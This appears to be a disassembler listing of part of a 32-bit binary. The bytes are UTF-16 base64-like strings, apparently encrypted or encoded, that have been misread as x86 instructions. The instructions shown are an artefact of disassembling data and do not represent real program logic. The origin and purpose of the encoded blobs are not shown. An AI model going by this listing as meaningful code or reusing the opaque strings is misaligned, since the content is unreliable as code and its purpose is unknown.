  40a39c:	00 49 00             	add    %cl,0x0(%ecx)
  40a39f:	78 00                	js     0x40a3a1
  40a3a1:	6a 00                	push   $0x0
  40a3a3:	50                   	push   %eax
  40a3a4:	00 79 00             	add    %bh,0x0(%ecx)
  40a3a7:	38 00                	cmp    %al,(%eax)
  40a3a9:	46                   	inc    %esi
  40a3aa:	00 33                	add    %dh,(%ebx)
  40a3ac:	00 47 00             	add    %al,0x0(%edi)
  40a3af:	47                   	inc    %edi
  40a3b0:	00 67 00             	add    %ah,0x0(%edi)
  40a3b3:	4b                   	dec    %ebx
  40a3b4:	00 43 00             	add    %al,0x0(%ebx)
  40a3b7:	36 00 4c 00 37       	add    %cl,%ss:0x37(%eax,%eax,1)
  40a3bc:	00 37                	add    %dh,(%edi)
  40a3be:	00 75 00             	add    %dh,0x0(%ebp)
  40a3c1:	6c                   	insb   (%dx),%es:(%edi)
  40a3c2:	00 51 00             	add    %dl,0x0(%ecx)
  40a3c5:	48                   	dec    %eax
  40a3c6:	00 39                	add    %bh,(%ecx)
  40a3c8:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  40a3cc:	00 71 00             	add    %dh,0x0(%ecx)
  40a3cf:	31 00                	xor    %eax,(%eax)
  40a3d1:	30 00                	xor    %al,(%eax)
  40a3d3:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40a3d7:	38 00                	cmp    %al,(%eax)
  40a3d9:	61                   	popa
  40a3da:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40a3de:	00 79 00             	add    %bh,0x0(%ecx)
  40a3e1:	44                   	inc    %esp
  40a3e2:	00 79 00             	add    %bh,0x0(%ecx)
  40a3e5:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40a3e9:	61                   	popa
  40a3ea:	00 52 00             	add    %dl,0x0(%edx)
  40a3ed:	48                   	dec    %eax
  40a3ee:	00 36                	add    %dh,(%esi)
  40a3f0:	00 4b 00             	add    %cl,0x0(%ebx)
  40a3f3:	46                   	inc    %esi
  40a3f4:	00 42 00             	add    %al,0x0(%edx)
  40a3f7:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40a3fb:	46                   	inc    %esi
  40a3fc:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40a400:	00 4a 00             	add    %cl,0x0(%edx)
  40a403:	30 00                	xor    %al,(%eax)
  40a405:	41                   	inc    %ecx
  40a406:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40a40c:	92                   	xchg   %eax,%edx
  40a40d:	59                   	pop    %ecx
  40a40e:	59                   	pop    %ecx
  40a40f:	00 35 00 43 00 79    	add    %dh,0x79004300
  40a415:	00 4b 00             	add    %cl,0x0(%ebx)
  40a418:	68 00 75 00 63       	push   $0x63007500
  40a41d:	00 43 00             	add    %al,0x0(%ebx)
  40a420:	4f                   	dec    %edi
  40a421:	00 45 00             	add    %al,0x0(%ebp)
  40a424:	77 00                	ja     0x40a426
  40a426:	70 00                	jo     0x40a428
  40a428:	36 00 6b 00          	add    %ch,%ss:0x0(%ebx)
  40a42c:	6a 00                	push   $0x0
  40a42e:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  40a432:	41                   	inc    %ecx
  40a433:	00 68 00             	add    %ch,0x0(%eax)
  40a436:	6f                   	outsl  %ds:(%esi),(%dx)
  40a437:	00 6e 00             	add    %ch,0x0(%esi)
  40a43a:	33 00                	xor    (%eax),%eax
  40a43c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a43d:	00 4f 00             	add    %cl,0x0(%edi)
  40a440:	50                   	push   %eax
  40a441:	00 35 00 75 00 55    	add    %dh,0x55007500
  40a447:	00 4c 00 75          	add    %cl,0x75(%eax,%eax,1)
  40a44b:	00 65 00             	add    %ah,0x0(%ebp)
  40a44e:	4b                   	dec    %ebx
  40a44f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a452:	56                   	push   %esi
  40a453:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a456:	55                   	push   %ebp
  40a457:	00 49 00             	add    %cl,0x0(%ecx)
  40a45a:	39 00                	cmp    %eax,(%eax)
  40a45c:	4c                   	dec    %esp
  40a45d:	00 37                	add    %dh,(%edi)
  40a45f:	00 79 00             	add    %bh,0x0(%ecx)
  40a462:	42                   	inc    %edx
  40a463:	00 30                	add    %dh,(%eax)
  40a465:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
  40a469:	00 4d 00             	add    %cl,0x0(%ebp)
  40a46c:	76 00                	jbe    0x40a46e
  40a46e:	70 00                	jo     0x40a470
  40a470:	62 00                	bound  %eax,(%eax)
  40a472:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  40a476:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  40a47a:	58                   	pop    %eax
  40a47b:	00 68 00             	add    %ch,0x0(%eax)
  40a47e:	62 00                	bound  %eax,(%eax)
  40a480:	34 00                	xor    $0x0,%al
  40a482:	52                   	push   %edx
  40a483:	00 5a 00             	add    %bl,0x0(%edx)
  40a486:	4f                   	dec    %edi
  40a487:	00 75 00             	add    %dh,0x0(%ebp)
  40a48a:	4f                   	dec    %edi
  40a48b:	00 6a 00             	add    %ch,0x0(%edx)
  40a48e:	39 00                	cmp    %eax,(%eax)
  40a490:	6c                   	insb   (%dx),%es:(%edi)
  40a491:	00 6d 00             	add    %ch,0x0(%ebp)
  40a494:	72 00                	jb     0x40a496
  40a496:	69 00 4b 00 67 00    	imul   $0x67004b,(%eax),%eax
  40a49c:	2f                   	das
  40a49d:	00 6e 00             	add    %ch,0x0(%esi)
  40a4a0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4a1:	00 47 00             	add    %al,0x0(%edi)
  40a4a4:	78 00                	js     0x40a4a6
  40a4a6:	6b 00 78             	imul   $0x78,(%eax),%eax
  40a4a9:	00 4f 00             	add    %cl,0x0(%edi)
  40a4ac:	62 00                	bound  %eax,(%eax)
  40a4ae:	41                   	inc    %ecx
  40a4af:	00 76 00             	add    %dh,0x0(%esi)
  40a4b2:	58                   	pop    %eax
  40a4b3:	00 51 00             	add    %dl,0x0(%ecx)
  40a4b6:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40a4ba:	6a 00                	push   $0x0
  40a4bc:	43                   	inc    %ebx
  40a4bd:	00 38                	add    %bh,(%eax)
  40a4bf:	00 7a 00             	add    %bh,0x0(%edx)
  40a4c2:	70 00                	jo     0x40a4c4
  40a4c4:	62 00                	bound  %eax,(%eax)
  40a4c6:	35 00 67 00 52       	xor    $0x52006700,%eax
  40a4cb:	00 4f 00             	add    %cl,0x0(%edi)
  40a4ce:	4f                   	dec    %edi
  40a4cf:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  40a4d3:	00 5a 00             	add    %bl,0x0(%edx)
  40a4d6:	52                   	push   %edx
  40a4d7:	00 72 00             	add    %dh,0x0(%edx)
  40a4da:	4e                   	dec    %esi
  40a4db:	00 71 00             	add    %dh,0x0(%ecx)
  40a4de:	45                   	inc    %ebp
  40a4df:	00 46 00             	add    %al,0x0(%esi)
  40a4e2:	48                   	dec    %eax
  40a4e3:	00 66 00             	add    %ah,0x0(%esi)
  40a4e6:	75 00                	jne    0x40a4e8
  40a4e8:	6b 00 69             	imul   $0x69,(%eax),%eax
  40a4eb:	00 77 00             	add    %dh,0x0(%edi)
  40a4ee:	7a 00                	jp     0x40a4f0
  40a4f0:	5a                   	pop    %edx
  40a4f1:	00 52 00             	add    %dl,0x0(%edx)
  40a4f4:	2f                   	das
  40a4f5:	00 7a 00             	add    %bh,0x0(%edx)
  40a4f8:	4c                   	dec    %esp
  40a4f9:	00 38                	add    %bh,(%eax)
  40a4fb:	00 79 00             	add    %bh,0x0(%ecx)
  40a4fe:	4d                   	dec    %ebp
  40a4ff:	00 62 00             	add    %ah,0x0(%edx)
  40a502:	72 00                	jb     0x40a504
  40a504:	4d                   	dec    %ebp
  40a505:	00 62 00             	add    %ah,0x0(%edx)
  40a508:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  40a50c:	76 00                	jbe    0x40a50e
  40a50e:	33 00                	xor    (%eax),%eax
  40a510:	44                   	inc    %esp
  40a511:	00 67 00             	add    %ah,0x0(%edi)
  40a514:	31 00                	xor    %eax,(%eax)
  40a516:	34 00                	xor    $0x0,%al
  40a518:	59                   	pop    %ecx
  40a519:	00 69 00             	add    %ch,0x0(%ecx)
  40a51c:	46                   	inc    %esi
  40a51d:	00 56 00             	add    %dl,0x0(%esi)
  40a520:	77 00                	ja     0x40a522
  40a522:	50                   	push   %eax
  40a523:	00 4b 00             	add    %cl,0x0(%ebx)
  40a526:	5a                   	pop    %edx
  40a527:	00 32                	add    %dh,(%edx)
  40a529:	00 69 00             	add    %ch,0x0(%ecx)
  40a52c:	55                   	push   %ebp
  40a52d:	00 77 00             	add    %dh,0x0(%edi)
  40a530:	68 00 33 00 6b       	push   $0x6b003300
  40a535:	00 71 00             	add    %dh,0x0(%ecx)
  40a538:	77 00                	ja     0x40a53a
  40a53a:	51                   	push   %ecx
  40a53b:	00 68 00             	add    %ch,0x0(%eax)
  40a53e:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
  40a542:	4c                   	dec    %esp
  40a543:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  40a547:	00 46 00             	add    %al,0x0(%esi)
  40a54a:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  40a54e:	73 00                	jae    0x40a550
  40a550:	78 00                	js     0x40a552
  40a552:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  40a556:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  40a55a:	33 00                	xor    (%eax),%eax
  40a55c:	31 00                	xor    %eax,(%eax)
  40a55e:	66 00 43 00          	data16 add %al,0x0(%ebx)
  40a562:	33 00                	xor    (%eax),%eax
  40a564:	6a 00                	push   $0x0
  40a566:	75 00                	jne    0x40a568
  40a568:	73 00                	jae    0x40a56a
  40a56a:	54                   	push   %esp
  40a56b:	00 30                	add    %dh,(%eax)
  40a56d:	00 57 00             	add    %dl,0x0(%edi)
  40a570:	6e                   	outsb  %ds:(%esi),(%dx)
  40a571:	00 6f 00             	add    %ch,0x0(%edi)
  40a574:	72 00                	jb     0x40a576
  40a576:	4f                   	dec    %edi
  40a577:	00 4d 00             	add    %cl,0x0(%ebp)
  40a57a:	54                   	push   %esp
  40a57b:	00 59 00             	add    %bl,0x0(%ecx)
  40a57e:	6a 00                	push   $0x0
  40a580:	44                   	inc    %esp
  40a581:	00 49 00             	add    %cl,0x0(%ecx)
  40a584:	45                   	inc    %ebp
  40a585:	00 53 00             	add    %dl,0x0(%ebx)
  40a588:	73 00                	jae    0x40a58a
  40a58a:	59                   	pop    %ecx
  40a58b:	00 65 00             	add    %ah,0x0(%ebp)
  40a58e:	37                   	aaa
  40a58f:	00 6a 00             	add    %ch,0x0(%edx)
  40a592:	66 00 70 00          	data16 add %dh,0x0(%eax)
  40a596:	50                   	push   %eax
  40a597:	00 51 00             	add    %dl,0x0(%ecx)
  40a59a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a59b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a59e:	50                   	push   %eax
  40a59f:	00 73 00             	add    %dh,0x0(%ebx)
  40a5a2:	69 00 43 00 74 00    	imul   $0x740043,(%eax),%eax
  40a5a8:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40a5ac:	31 00                	xor    %eax,(%eax)
  40a5ae:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5af:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  40a5b3:	00 33                	add    %dh,(%ebx)
  40a5b5:	00 68 00             	add    %ch,0x0(%eax)
  40a5b8:	62 00                	bound  %eax,(%eax)
  40a5ba:	50                   	push   %eax
  40a5bb:	00 59 00             	add    %bl,0x0(%ecx)
  40a5be:	73 00                	jae    0x40a5c0
  40a5c0:	67 00 6f 00          	add    %ch,0x0(%bx)
  40a5c4:	50                   	push   %eax
  40a5c5:	00 68 00             	add    %ch,0x0(%eax)
  40a5c8:	7a 00                	jp     0x40a5ca
  40a5ca:	45                   	inc    %ebp
  40a5cb:	00 46 00             	add    %al,0x0(%esi)
  40a5ce:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5cf:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a5d2:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5d3:	00 76 00             	add    %dh,0x0(%esi)
  40a5d6:	4e                   	dec    %esi
  40a5d7:	00 57 00             	add    %dl,0x0(%edi)
  40a5da:	35 00 6a 00 39       	xor    $0x39006a00,%eax
  40a5df:	00 58 00             	add    %bl,0x0(%eax)
  40a5e2:	70 00                	jo     0x40a5e4
  40a5e4:	34 00                	xor    $0x0,%al
  40a5e6:	64 00 36             	add    %dh,%fs:(%esi)
  40a5e9:	00 33                	add    %dh,(%ebx)
  40a5eb:	00 68 00             	add    %ch,0x0(%eax)
  40a5ee:	78 00                	js     0x40a5f0
  40a5f0:	76 00                	jbe    0x40a5f2
  40a5f2:	76 00                	jbe    0x40a5f4
  40a5f4:	6c                   	insb   (%dx),%es:(%edi)
  40a5f5:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  40a5f9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a5fc:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  40a600:	5a                   	pop    %edx
  40a601:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a604:	34 00                	xor    $0x0,%al
  40a606:	75 00                	jne    0x40a608
  40a608:	39 00                	cmp    %eax,(%eax)
  40a60a:	39 00                	cmp    %eax,(%eax)
  40a60c:	42                   	inc    %edx
  40a60d:	00 51 00             	add    %dl,0x0(%ecx)
  40a610:	4b                   	dec    %ebx
  40a611:	00 68 00             	add    %ch,0x0(%eax)
  40a614:	6c                   	insb   (%dx),%es:(%edi)
  40a615:	00 32                	add    %dh,(%edx)
  40a617:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  40a61b:	00 5a 00             	add    %bl,0x0(%edx)
  40a61e:	55                   	push   %ebp
  40a61f:	00 7a 00             	add    %bh,0x0(%edx)
  40a622:	4f                   	dec    %edi
  40a623:	00 35 00 30 00 63    	add    %dh,0x63003000
  40a629:	00 6b 00             	add    %ch,0x0(%ebx)
  40a62c:	7a 00                	jp     0x40a62e
  40a62e:	31 00                	xor    %eax,(%eax)
  40a630:	4d                   	dec    %ebp
  40a631:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40a635:	00 58 00             	add    %bl,0x0(%eax)
  40a638:	46                   	inc    %esi
  40a639:	00 57 00             	add    %dl,0x0(%edi)
  40a63c:	76 00                	jbe    0x40a63e
  40a63e:	44                   	inc    %esp
  40a63f:	00 35 00 44 00 4d    	add    %dh,0x4d004400
  40a645:	00 31                	add    %dh,(%ecx)
  40a647:	00 77 00             	add    %dh,0x0(%edi)
  40a64a:	71 00                	jno    0x40a64c
  40a64c:	66 00 4f 00          	data16 add %cl,0x0(%edi)
  40a650:	72 00                	jb     0x40a652
  40a652:	56                   	push   %esi
  40a653:	00 76 00             	add    %dh,0x0(%esi)
  40a656:	69 00 73 00 36 00    	imul   $0x360073,(%eax),%eax
  40a65c:	4c                   	dec    %esp
  40a65d:	00 65 00             	add    %ah,0x0(%ebp)
  40a660:	46                   	inc    %esi
  40a661:	00 45 00             	add    %al,0x0(%ebp)
  40a664:	79 00                	jns    0x40a666
  40a666:	4f                   	dec    %edi
  40a667:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a66a:	78 00                	js     0x40a66c
  40a66c:	30 00                	xor    %al,(%eax)
  40a66e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a66f:	00 76 00             	add    %dh,0x0(%esi)
  40a672:	4e                   	dec    %esi
  40a673:	00 78 00             	add    %bh,0x0(%eax)
  40a676:	42                   	inc    %edx
  40a677:	00 70 00             	add    %dh,0x0(%eax)
  40a67a:	4f                   	dec    %edi
  40a67b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a67e:	79 00                	jns    0x40a680
  40a680:	33 00                	xor    (%eax),%eax
  40a682:	50                   	push   %eax
  40a683:	00 67 00             	add    %ah,0x0(%edi)
  40a686:	66 00 78 00          	data16 add %bh,0x0(%eax)
  40a68a:	64 00 4c 00 66       	add    %cl,%fs:0x66(%eax,%eax,1)
  40a68f:	00 71 00             	add    %dh,0x0(%ecx)
  40a692:	46                   	inc    %esi
  40a693:	00 7a 00             	add    %bh,0x0(%edx)
  40a696:	45                   	inc    %ebp
  40a697:	00 6f 00             	add    %ch,0x0(%edi)
  40a69a:	30 00                	xor    %al,(%eax)
  40a69c:	6c                   	insb   (%dx),%es:(%edi)
  40a69d:	00 53 00             	add    %dl,0x0(%ebx)
  40a6a0:	74 00                	je     0x40a6a2
  40a6a2:	4b                   	dec    %ebx
  40a6a3:	00 6b 00             	add    %ch,0x0(%ebx)
  40a6a6:	70 00                	jo     0x40a6a8
  40a6a8:	55                   	push   %ebp
  40a6a9:	00 79 00             	add    %bh,0x0(%ecx)
  40a6ac:	55                   	push   %ebp
  40a6ad:	00 6d 00             	add    %ch,0x0(%ebp)
  40a6b0:	66 00 4f 00          	data16 add %cl,0x0(%edi)
  40a6b4:	4e                   	dec    %esi
  40a6b5:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a6b8:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40a6bc:	4f                   	dec    %edi
  40a6bd:	00 51 00             	add    %dl,0x0(%ecx)
  40a6c0:	45                   	inc    %ebp
  40a6c1:	00 70 00             	add    %dh,0x0(%eax)
  40a6c4:	56                   	push   %esi
  40a6c5:	00 4e 00             	add    %cl,0x0(%esi)
  40a6c8:	78 00                	js     0x40a6ca
  40a6ca:	61                   	popa
  40a6cb:	00 79 00             	add    %bh,0x0(%ecx)
  40a6ce:	50                   	push   %eax
  40a6cf:	00 51 00             	add    %dl,0x0(%ecx)
  40a6d2:	30 00                	xor    %al,(%eax)
  40a6d4:	59                   	pop    %ecx
  40a6d5:	00 63 00             	add    %ah,0x0(%ebx)
  40a6d8:	52                   	push   %edx
  40a6d9:	00 70 00             	add    %dh,0x0(%eax)
  40a6dc:	75 00                	jne    0x40a6de
  40a6de:	58                   	pop    %eax
  40a6df:	00 49 00             	add    %cl,0x0(%ecx)
  40a6e2:	58                   	pop    %eax
  40a6e3:	00 66 00             	add    %ah,0x0(%esi)
  40a6e6:	6b 00 30             	imul   $0x30,(%eax),%eax
  40a6e9:	00 63 00             	add    %ah,0x0(%ebx)
  40a6ec:	31 00                	xor    %eax,(%eax)
  40a6ee:	51                   	push   %ecx
  40a6ef:	00 4b 00             	add    %cl,0x0(%ebx)
  40a6f2:	2b 00                	sub    (%eax),%eax
  40a6f4:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40a6f8:	48                   	dec    %eax
  40a6f9:	00 7a 00             	add    %bh,0x0(%edx)
  40a6fc:	51                   	push   %ecx
  40a6fd:	00 51 00             	add    %dl,0x0(%ecx)
  40a700:	57                   	push   %edi
  40a701:	00 31                	add    %dh,(%ecx)
  40a703:	00 4b 00             	add    %cl,0x0(%ebx)
  40a706:	5a                   	pop    %edx
  40a707:	00 4e 00             	add    %cl,0x0(%esi)
  40a70a:	71 00                	jno    0x40a70c
  40a70c:	34 00                	xor    $0x0,%al
  40a70e:	41                   	inc    %ecx
  40a70f:	00 46 00             	add    %al,0x0(%esi)
  40a712:	4c                   	dec    %esp
  40a713:	00 63 00             	add    %ah,0x0(%ebx)
  40a716:	30 00                	xor    %al,(%eax)
  40a718:	5a                   	pop    %edx
  40a719:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  40a71d:	00 7a 00             	add    %bh,0x0(%edx)
  40a720:	65 00 4c 00 6b       	add    %cl,%gs:0x6b(%eax,%eax,1)
  40a725:	00 52 00             	add    %dl,0x0(%edx)
  40a728:	32 00                	xor    (%eax),%al
  40a72a:	41                   	inc    %ecx
  40a72b:	00 41 00             	add    %al,0x0(%ecx)
  40a72e:	2b 00                	sub    (%eax),%eax
  40a730:	57                   	push   %edi
  40a731:	00 50 00             	add    %dl,0x0(%eax)
  40a734:	6e                   	outsb  %ds:(%esi),(%dx)
  40a735:	00 75 00             	add    %dh,0x0(%ebp)
  40a738:	35 00 41 00 2b       	xor    $0x2b004100,%eax
  40a73d:	00 71 00             	add    %dh,0x0(%ecx)
  40a740:	43                   	inc    %ebx
  40a741:	00 51 00             	add    %dl,0x0(%ecx)
  40a744:	59                   	pop    %ecx
  40a745:	00 38                	add    %bh,(%eax)
  40a747:	00 36                	add    %dh,(%esi)
  40a749:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
  40a74d:	00 4e 00             	add    %cl,0x0(%esi)
  40a750:	6c                   	insb   (%dx),%es:(%edi)
  40a751:	00 68 00             	add    %ch,0x0(%eax)
  40a754:	76 00                	jbe    0x40a756
  40a756:	38 00                	cmp    %al,(%eax)
  40a758:	6f                   	outsl  %ds:(%esi),(%dx)
  40a759:	00 71 00             	add    %dh,0x0(%ecx)
  40a75c:	35 00 6d 00 7a       	xor    $0x7a006d00,%eax
  40a761:	00 42 00             	add    %al,0x0(%edx)
  40a764:	68 00 79 00 63       	push   $0x63007900
  40a769:	00 33                	add    %dh,(%ebx)
  40a76b:	00 68 00             	add    %ch,0x0(%eax)
  40a76e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a76f:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40a773:	00 70 00             	add    %dh,0x0(%eax)
  40a776:	2b 00                	sub    (%eax),%eax
  40a778:	45                   	inc    %ebp
  40a779:	00 56 00             	add    %dl,0x0(%esi)
  40a77c:	42                   	inc    %edx
  40a77d:	00 2b                	add    %ch,(%ebx)
  40a77f:	00 56 00             	add    %dl,0x0(%esi)
  40a782:	39 00                	cmp    %eax,(%eax)
  40a784:	2b 00                	sub    (%eax),%eax
  40a786:	58                   	pop    %eax
  40a787:	00 2f                	add    %ch,(%edi)
  40a789:	00 6d 00             	add    %ch,0x0(%ebp)
  40a78c:	30 00                	xor    %al,(%eax)
  40a78e:	4c                   	dec    %esp
  40a78f:	00 6f 00             	add    %ch,0x0(%edi)
  40a792:	4a                   	dec    %edx
  40a793:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  40a797:	00 53 00             	add    %dl,0x0(%ebx)
  40a79a:	52                   	push   %edx
  40a79b:	00 5a 00             	add    %bl,0x0(%edx)
  40a79e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a79f:	00 36                	add    %dh,(%esi)
  40a7a1:	00 4b 00             	add    %cl,0x0(%ebx)
  40a7a4:	70 00                	jo     0x40a7a6
  40a7a6:	44                   	inc    %esp
  40a7a7:	00 56 00             	add    %dl,0x0(%esi)
  40a7aa:	34 00                	xor    $0x0,%al
  40a7ac:	57                   	push   %edi
  40a7ad:	00 59 00             	add    %bl,0x0(%ecx)
  40a7b0:	77 00                	ja     0x40a7b2
  40a7b2:	46                   	inc    %esi
  40a7b3:	00 6f 00             	add    %ch,0x0(%edi)
  40a7b6:	77 00                	ja     0x40a7b8
  40a7b8:	48                   	dec    %eax
  40a7b9:	00 51 00             	add    %dl,0x0(%ecx)
  40a7bc:	4e                   	dec    %esi
  40a7bd:	00 79 00             	add    %bh,0x0(%ecx)
  40a7c0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7c1:	00 32                	add    %dh,(%edx)
  40a7c3:	00 76 00             	add    %dh,0x0(%esi)
  40a7c6:	67 00 33             	add    %dh,(%bp,%di)
  40a7c9:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  40a7cd:	00 38                	add    %bh,(%eax)
  40a7cf:	00 65 00             	add    %ah,0x0(%ebp)
  40a7d2:	73 00                	jae    0x40a7d4
  40a7d4:	62 00                	bound  %eax,(%eax)
  40a7d6:	70 00                	jo     0x40a7d8
  40a7d8:	7a 00                	jp     0x40a7da
  40a7da:	4d                   	dec    %ebp
  40a7db:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  40a7df:	00 31                	add    %dh,(%ecx)
  40a7e1:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a7e5:	00 32                	add    %dh,(%edx)
  40a7e7:	00 51 00             	add    %dl,0x0(%ecx)
  40a7ea:	58                   	pop    %eax
  40a7eb:	00 5a 00             	add    %bl,0x0(%edx)
  40a7ee:	4e                   	dec    %esi
  40a7ef:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  40a7f3:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40a7f7:	00 43 00             	add    %al,0x0(%ebx)
  40a7fa:	48                   	dec    %eax
  40a7fb:	00 57 00             	add    %dl,0x0(%edi)
  40a7fe:	4c                   	dec    %esp
  40a7ff:	00 50 00             	add    %dl,0x0(%eax)
  40a802:	31 00                	xor    %eax,(%eax)
  40a804:	5a                   	pop    %edx
  40a805:	00 4a 00             	add    %cl,0x0(%edx)
  40a808:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  40a80c:	37                   	aaa
  40a80d:	00 70 00             	add    %dh,0x0(%eax)
  40a810:	78 00                	js     0x40a812
  40a812:	7a 00                	jp     0x40a814
  40a814:	6a 00                	push   $0x0
  40a816:	72 00                	jb     0x40a818
  40a818:	69 00 31 00 34 00    	imul   $0x340031,(%eax),%eax
  40a81e:	66 00 35 00 67 00 39 	data16 add %dh,0x39006700
  40a825:	00 30                	add    %dh,(%eax)
  40a827:	00 31                	add    %dh,(%ecx)
  40a829:	00 39                	add    %bh,(%ecx)
  40a82b:	00 56 00             	add    %dl,0x0(%esi)
  40a82e:	6a 00                	push   $0x0
  40a830:	4a                   	dec    %edx
  40a831:	00 70 00             	add    %dh,0x0(%eax)
  40a834:	46                   	inc    %esi
  40a835:	00 4a 00             	add    %cl,0x0(%edx)
  40a838:	33 00                	xor    (%eax),%eax
  40a83a:	75 00                	jne    0x40a83c
  40a83c:	6b 00 38             	imul   $0x38,(%eax),%eax
  40a83f:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40a843:	00 33                	add    %dh,(%ebx)
  40a845:	00 49 00             	add    %cl,0x0(%ecx)
  40a848:	50                   	push   %eax
  40a849:	00 39                	add    %bh,(%ecx)
  40a84b:	00 78 00             	add    %bh,0x0(%eax)
  40a84e:	35 00 6e 00 64       	xor    $0x64006e00,%eax
  40a853:	00 42 00             	add    %al,0x0(%edx)
  40a856:	34 00                	xor    $0x0,%al
  40a858:	39 00                	cmp    %eax,(%eax)
  40a85a:	7a 00                	jp     0x40a85c
  40a85c:	5a                   	pop    %edx
  40a85d:	00 57 00             	add    %dl,0x0(%edi)
  40a860:	6e                   	outsb  %ds:(%esi),(%dx)
  40a861:	00 75 00             	add    %dh,0x0(%ebp)
  40a864:	4d                   	dec    %ebp
  40a865:	00 49 00             	add    %cl,0x0(%ecx)
  40a868:	33 00                	xor    (%eax),%eax
  40a86a:	69 00 34 00 45 00    	imul   $0x450034,(%eax),%eax
  40a870:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40a874:	4a                   	dec    %edx
  40a875:	00 55 00             	add    %dl,0x0(%ebp)
  40a878:	79 00                	jns    0x40a87a
  40a87a:	4b                   	dec    %ebx
  40a87b:	00 51 00             	add    %dl,0x0(%ecx)
  40a87e:	70 00                	jo     0x40a880
  40a880:	69 00 6d 00 47 00    	imul   $0x47006d,(%eax),%eax
  40a886:	76 00                	jbe    0x40a888
  40a888:	6c                   	insb   (%dx),%es:(%edi)
  40a889:	00 58 00             	add    %bl,0x0(%eax)
  40a88c:	78 00                	js     0x40a88e
  40a88e:	57                   	push   %edi
  40a88f:	00 55 00             	add    %dl,0x0(%ebp)
  40a892:	2b 00                	sub    (%eax),%eax
  40a894:	73 00                	jae    0x40a896
  40a896:	4c                   	dec    %esp
  40a897:	00 61 00             	add    %ah,0x0(%ecx)
  40a89a:	47                   	inc    %edi
  40a89b:	00 69 00             	add    %ch,0x0(%ecx)
  40a89e:	30 00                	xor    %al,(%eax)
  40a8a0:	2f                   	das
  40a8a1:	00 48 00             	add    %cl,0x0(%eax)
  40a8a4:	55                   	push   %ebp
  40a8a5:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  40a8a9:	00 70 00             	add    %dh,0x0(%eax)
  40a8ac:	70 00                	jo     0x40a8ae
  40a8ae:	78 00                	js     0x40a8b0
  40a8b0:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  40a8b4:	76 00                	jbe    0x40a8b6
  40a8b6:	2f                   	das
  40a8b7:	00 78 00             	add    %bh,0x0(%eax)
  40a8ba:	72 00                	jb     0x40a8bc
  40a8bc:	41                   	inc    %ecx
  40a8bd:	00 31                	add    %dh,(%ecx)
  40a8bf:	00 58 00             	add    %bl,0x0(%eax)
  40a8c2:	35 00 55 00 32       	xor    $0x32005500,%eax
  40a8c7:	00 36                	add    %dh,(%esi)
  40a8c9:	00 38                	add    %bh,(%eax)
  40a8cb:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8ce:	4b                   	dec    %ebx
  40a8cf:	00 67 00             	add    %ah,0x0(%edi)
  40a8d2:	64 00 78 00          	add    %bh,%fs:0x0(%eax)
  40a8d6:	53                   	push   %ebx
  40a8d7:	00 53 00             	add    %dl,0x0(%ebx)
  40a8da:	74 00                	je     0x40a8dc
  40a8dc:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  40a8e0:	31 00                	xor    %eax,(%eax)
  40a8e2:	65 00 46 00          	add    %al,%gs:0x0(%esi)
  40a8e6:	38 00                	cmp    %al,(%eax)
  40a8e8:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
